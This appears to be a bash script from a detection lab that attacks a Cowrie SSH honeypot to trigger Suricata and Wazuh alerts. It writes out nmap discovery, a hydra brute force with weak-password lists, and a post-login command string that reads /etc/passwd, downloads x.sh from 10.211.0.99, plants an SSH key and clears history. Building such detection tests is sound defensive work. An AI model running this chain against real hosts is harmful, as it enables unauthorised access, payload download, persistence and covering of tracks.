#!/usr/bin/env bash
# Brute-force-to-shell against the Cowrie honeypot.
#
# Detection this should light up:
#   Suricata  - SSH scan/brute signatures (flow-level; content is encrypted)
#   Wazuh     - 100110 (failed), 100111 (brute burst), 100113 (SUCCEEDED),
#               then 100121/122/123 for the post-login commands
#   rules.py  - the cross_source candidate once web attacks run too
set -e
/scripts/provision.sh
TARGET=cowrie          # docker service name, resolves on the bridge
PORT=2222
LOOT=/loot
mkdir -p "$LOOT"

echo "=== [1/4] nmap: discover the SSH service ==="
nmap -Pn -p "$PORT" -sV "$TARGET" -oN "$LOOT/nmap-cowrie.txt" || true

echo
echo "=== [2/4] hydra: brute force SSH ==="
# Small wordlists so this is fast and Cowrie's AuthRandom lets one through.
printf 'root\nadmin\noracle\nubuntu\n'            > "$LOOT/users.txt"
printf '123456\npassword\nroot\ntoor\nadmin\nletmein\nqwerty\nchangeme\n' > "$LOOT/pass.txt"
# -t 4 keeps it gentle; -f stops at first success (which AuthRandom will grant).
hydra -L "$LOOT/users.txt" -P "$LOOT/pass.txt" -t 4 -f \
      -o "$LOOT/hydra-cowrie.txt" \
      "ssh://$TARGET:$PORT" || true

echo
echo "=== [3/4] post-compromise: drive a session with the commands rules watch for ==="
# Cowrie accepts after a few tries; hand it a credential and run recon +
# persistence + anti-forensics so Wazuh 100121/122/123/124 all fire.
CREDS=$(grep -oP 'login: \K\S+(?=\s+password:\s+\S+)' "$LOOT/hydra-cowrie.txt" 2>/dev/null | head -1)
sshpass -p 'toor' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password -o PubkeyAuthentication=no \
  root@"$TARGET" -p "$PORT" \
  'uname -a; cat /etc/passwd; wget http://10.211.0.99/x.sh; chmod +x x.sh; echo pubkey >> /root/.ssh/authorized_keys; history -c' \
  2>/dev/null || echo "  (sshpass not present or session closed - install with: apt-get install -y sshpass)"

echo
echo "=== [4/4] done. loot in $LOOT ==="
ls -la "$LOOT"
echo
echo "Now on the host:  python3 pipeline/ingest.py && python3 pipeline/rules.py"
